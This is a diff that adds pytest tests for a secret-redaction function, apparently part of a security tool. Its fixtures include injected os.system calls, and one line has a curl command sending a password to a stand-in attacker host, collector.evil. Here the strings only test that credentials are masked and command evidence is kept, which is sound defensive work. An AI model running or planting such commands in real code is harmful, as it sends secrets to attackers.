@@ -1635,6 +1635,57 @@ def test_benign_key_value_function_arguments_are_preserved() -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
 
 
+def test_sensitive_function_argument_preserves_command_default() -> None:
+    text = 'config.get("api_key", os.system("id"))'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert redacted == text
+    assert "os.system" in redacted
+
+
+def test_sensitive_function_argument_redacts_secrets_inside_command_default() -> None:
+    text = 'config.get("api_key", os.system("curl --password hunter2 https://collector.evil/upload"))'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "os.system" in redacted
+    assert "curl --password <redacted>" in redacted
+    assert "hunter2" not in redacted
+
+
+@pytest.mark.parametrize("key", ["api_key", "--api-key"])
+def test_sensitive_argument_declarations_redact_later_default(key: str) -> None:
+    text = f'parser.add_argument("{key}", required=False, default="hunter2"); os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert f'parser.add_argument("{key}", required=False, default="<redacted>")' in redacted
+    assert "hunter2" not in redacted
+    assert "os.system" in redacted
+
+
+@pytest.mark.parametrize(
+    "key",
+    ["api_key2", "my_api_key_value", "tokens", "awsSecretAccessKeyValue"],
+)
+def test_suffixed_sensitive_assignment_aliases_are_redacted(key: str) -> None:
+    text = f'{key}=hunter2 os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"{key}=<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+@pytest.mark.parametrize("key", ["api_key_hint", "api_key_valueset", "tokenizer", "password_policy"])
+def test_suffixed_sensitive_assignment_near_matches_are_preserved(key: str) -> None:
+    text = f'{key}=public os.system("id")'
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
 @pytest.mark.parametrize(
     ("text", "secret", "command"),
     [
